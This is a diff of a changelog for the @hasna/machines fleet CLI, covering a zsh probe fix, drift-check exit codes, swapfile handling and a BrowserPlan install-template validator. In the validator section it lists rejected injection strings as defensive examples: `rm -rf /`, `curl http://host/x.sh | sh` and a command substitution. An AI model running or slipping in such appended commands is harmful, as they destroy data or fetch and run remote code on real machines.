@@ -1,5 +1,14 @@
 # Changelog
 
+## 0.2.28
+
+### Patch Changes
+
+- 1413b5e: Generated Bun package probes (`machines apps plan`/`apply`) now execute under an explicit `bash -c` wrapper, fixing `zsh:1: parse error near 'printf'` on macOS targets whose remote login shell is zsh — installs ran but verification always failed (bug e406620f, measured station03). The output contract is unchanged and linux targets keep working. Shipped as 0.2.27 with the station-template floor bump.
+- Updated dependencies [b630c48]
+  - @hasna/contracts@0.11.2
+  - @hasna/events@0.1.16
+
 All notable changes to `@hasna/machines` are documented here. The format is
 based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this
 project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
@@ -18,7 +27,7 @@ project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   an explicit `bash -c` wrapper, so the probe script parses on macOS targets
   whose remote login shell is zsh. Previously the multi-line bash probe was
   parsed by the login shell directly and failed with `zsh:1: parse error near
-  'printf'`, so installs ran but verification always failed on macOS (bug task
+'printf'`, so installs ran but verification always failed on macOS (bug task
   e406620f; measured on station03). Linux targets are unaffected.
 
 ## [0.2.26] - 2026-08-14
@@ -51,7 +60,7 @@ reported success about things it had not actually established.
   incomplete** (defect 2bfe61b0). It previously exited 0 whether the verdict
   was `clean` or `drift`, so it was structurally unable to fail: every caller
   in the fleet parsed the JSON `verdict` and recorded `check_rc=0 (NOT
-  trusted)`. A check that cannot fail is not a gate. Findings outrank
+trusted)`. A check that cannot fail is not a gate. Findings outrank
   incompleteness; `2` exists because a check with `skipped` items has not
   proven the box clean, it has proven it could not look. `--no-fail-on-findings`
   restores the old always-0 behaviour for callers not ready to move — it
@@ -60,7 +69,7 @@ reported success about things it had not actually established.
   still the richer answer, because it names which item failed.
 
   The numbers, and the opt-out flag name, match the `0 clean / 1 findings /
-  2 incomplete` contract on the table for `todos doctor` (task 71f7faba). That
+2 incomplete` contract on the table for `todos doctor` (task 71f7faba). That
   contract is scoped to the todos CLI and has not landed, so it does not bind
   this one; conforming avoids a second numeric convention in the same estate.
 
@@ -363,7 +372,7 @@ Fixes OPE69-00017 via PR #70.
 - **Swapfile creation is convergent, space-guarded, and never fatal** in both
   renders. The old `test -f /swapfile ||` guard treated build 2's partial
   fallocate leftover as success forever (file present, `swapon --show` empty).
-  The guard is now *active* swap; a stale/partial file is removed before
+  The guard is now _active_ swap; a stale/partial file is removed before
   retrying; allocation is refused with a loud `NON-FATAL` warning unless
   `sizeGb + 2G` of headroom is free; the fstab entry is deduplicated.
 
@@ -400,7 +409,7 @@ Fixes OPE69-00017 via PR #70.
   station contract (`templates/station/template.json`) with two renderers over
   one source: `machines setup --template station,dgx-spark` for physical boxes
   and `machines setup --template station,ec2 --render cloud-init --station
-  <name>` for EC2 user-data. Every template item carries a `lesson` field naming
+<name>` for EC2 user-data. Every template item carries a `lesson` field naming
   the measured 2026-07-28 station01 failure it exists to prevent.
 - **Read-only drift check** — `machines setup --template <spec> --check` emits a
   JSON verdict (`clean` / `drift`) without mutating anything: file sha256,
@@ -435,7 +444,7 @@ Fixes OPE69-00017 via PR #70.
 - **BrowserPlan `app_install_update` no longer depends on a git checkout.** The
   hook's `command_template` was
   `cd <open-chrome-project-root> && git pull --ff-only origin main && bun install
-  --frozen-lockfile`, which cannot survive the owner-authorised retirement of the
+--frozen-lockfile`, which cannot survive the owner-authorised retirement of the
   BrowserPlan source repository. It is now
   `bun install -g @hasna/open-chrome@0.1.0`, installing from the npm package that
   ships the `browserplan` bin. `command_placeholders` becomes `[]` and
@@ -458,8 +467,8 @@ Fixes OPE69-00017 via PR #70.
   and that same change can bump the constant. `dist-tags` is
   `{"latest":"0.1.0"}` today, so the pin currently costs nothing at all.
 
-  No version *placeholder* is exposed either, because **nothing in this package
-  could resolve one**: `getPackageVersion()` returns *machines*' own version, and
+  No version _placeholder_ is exposed either, because **nothing in this package
+  could resolve one**: `getPackageVersion()` returns _machines_' own version, and
   unlike `machines reconcile` — which pins versions from the fleet manifest — the
   hook contract has no version source of truth. The template is directly runnable
   as emitted.
@@ -470,7 +479,7 @@ Fixes OPE69-00017 via PR #70.
   `browserplan browser status` (`daemon_status`), `browserplan tab list`
   (`tab_inventory`) and `browserplan remote status` (`supervisor_status`) print
   usage and **exit 0** while the payload still reports them `available: true,
-  readiness: "ready"` — so exit status cannot distinguish the no-op from success.
+readiness: "ready"` — so exit status cannot distinguish the no-op from success.
   This is pre-existing and not changed here (correcting it would mean touching the
   readiness contract) but it becomes materially more significant now that npm is
   the only artifact, so a consumer reading `readiness: "ready"` should know before
@@ -478,9 +487,9 @@ Fixes OPE69-00017 via PR #70.
 
 - **Disclosure, worse than the above: for `supervisor_status` the validator
   forbids the only command that works.** The emitted template is `browserplan
-  remote status …`, which `0.1.0` does not dispatch, while the long-standing rule
+remote status …`, which `0.1.0` does not dispatch, while the long-standing rule
   at `src/consumer-schema.ts` **rejects** any `supervisor_status` template
-  containing `remote start` — which is the *only* `remote` subcommand `0.1.0`
+  containing `remote start` — which is the _only_ `remote` subcommand `0.1.0`
   does dispatch. A consumer who diagnoses the broken command and corrects it
   therefore gets a validation failure for the fix. Left in place here because
   changing it is a consumer-visible validation change unrelated to the retirement,
@@ -496,11 +505,11 @@ Fixes OPE69-00017 via PR #70.
 ### Compatibility
 
 - **Consumers pinned to `@hasna/machines` <= 0.2.2 will reject the new
-  `app_install_update` payload.** The 0.2.2 validator *requires* the literal
+  `app_install_update` payload.** The 0.2.2 validator _requires_ the literal
   `<open-chrome-project-root>` token, which the new template does not contain, so
   an old validator reports `ok: false` with one `command_template` error per
   machine. `MACHINES_CONSUMER_CONTRACT_VERSION` is deliberately **left at `1`**:
-  raising it would make consumers treat *every* envelope as unsupported —
+  raising it would make consumers treat _every_ envelope as unsupported —
   the knowledge app's adapter (`src/machines.ts`, adapter contract version 1)
   reports `unsupported_contract_version` and returns `null` for topology, route
   and workspace payloads whose `schema_version` exceeds 1 — a far larger break
@@ -524,12 +533,12 @@ Fixes OPE69-00017 via PR #70.
 - **Validation expands for every template any released version actually emits, and
   narrows only for hand-edited variants.** `validateMachinesConsumerEnvelope`
   accepts an `app_install_update` template that is either `bun install -g
-  @hasna/open-chrome@` followed by a bare npm version or dist-tag — so a caller may
+@hasna/open-chrome@` followed by a bare npm version or dist-tag — so a caller may
   pin `…@0.1.0` rather than track `latest` — **or** exactly equals the legacy
   checkout template, so a payload cached from any version up to 0.2.2 keeps
   validating.
 
-  Precisely, and not overstated: the legacy arm is exact equality, so *modified*
+  Precisely, and not overstated: the legacy arm is exact equality, so _modified_
   legacy strings that 0.2.2 accepted are now refused — trailing or leading
   whitespace, a dropped `--frozen-lockfile`, an added flag, or `origin main`
   shortened to `origin`. No emitter produces those, and every template emitted by a
@@ -538,10 +547,10 @@ Fixes OPE69-00017 via PR #70.
 
   The version suffix is **end-anchored**, and that matters more than the prefix: a
   prefix-only check accepts anything appended after a valid install — `…@0.1.0 &&
-  rm -rf /`, `…@0.1.0; curl http://host/x.sh | sh`, `…@0.1.0; cd d && git pull`,
+rm -rf /`, `…@0.1.0; curl http://host/x.sh | sh`, `…@0.1.0; cd d && git pull`,
   `` `id` ``, `$(id)` — and an empty version. All rejected, as are git-based
   rewrites (`git fetch && git reset --hard`, `git -C <dir> pull`, `git clone`).
-  This is an allowlist of command *shape*, not a `git pull` phrase denylist, which
+  This is an allowlist of command _shape_, not a `git pull` phrase denylist, which
   would have been trivially evadable.
 
   The suffix must be an **exact semver or a dist-tag of two or more characters**.
@@ -558,7 +567,7 @@ Fixes OPE69-00017 via PR #70.
   more than `x`-characters into "any version" — `bun add @hasna/open-chrome@x.y`
   exits 0 and installs `0.1.0`, and `x.y` contains no wildcard character at all.
   Note also that **bun and npm disagree**: `npm view @hasna/open-chrome@x.y
-  version` returns `E404` for the same spec bun happily resolves. The hook command
+version` returns `E404` for the same spec bun happily resolves. The hook command
   is `bun install -g`, so bun is the oracle that matters.
 
   Residual, accepted knowingly: a dist-tag containing a dot would be rejected. npm
@@ -570,6 +579,7 @@ Fixes OPE69-00017 via PR #70.
   `lastIndex` between calls and return alternating results for successive machines
   in one payload. It is not a trust check: a legitimate but hostile-looking
   dist-tag such as `latest-evil` is accepted.
+
 - Every other BrowserPlan surface is unchanged — owner ids, target name, machine
   ids, operation ids, stable surfaces — and
   `schemas/machines-consumer.schema.json` is byte-for-byte identical, because the
@@ -603,7 +613,7 @@ Fixes OPE69-00017 via PR #70.
 - Fixed a `tsc` type-check/declaration-emit failure (TS2352) in
   `reportTopLevelError` (`src/cli/index.ts`): the Commander `exitCode` is now
   read via a single narrowing read instead of an invalid `Error -> { exitCode:
-  number }` cast, so `bun run build` / `verify:release` succeed. The emitted
+number }` cast, so `bun run build` / `verify:release` succeed. The emitted
   runtime JS is unchanged.
 - Replaced the unresolvable `@hasna/mcp-harness` dependency pin
   (`file:../open-mcp`) with the published registry range (`^0.1.0`). This clears
@@ -637,7 +647,7 @@ Fixes OPE69-00017 via PR #70.
   manifest, verifies CLI `--version` (and declared `hasna-*-mcp` health
   endpoints), rolls back to the prior version on verification failure, and
   emits `hasna.rollout_record.v1` events (`release.rollout.started/completed/
-  failed`, `app.installed`) through the `@hasna/events` envelope. Dry-run by
+failed`, `app.installed`) through the `@hasna/events` envelope. Dry-run by
   default; `--apply` requires scoped mutation approval. Triggerable from a
   `release.published` event via `--event-json` or `reconcileFromReleaseEvent`.
 - Added `machines freeze add|remove|list|check`: supply-chain freeze gate that
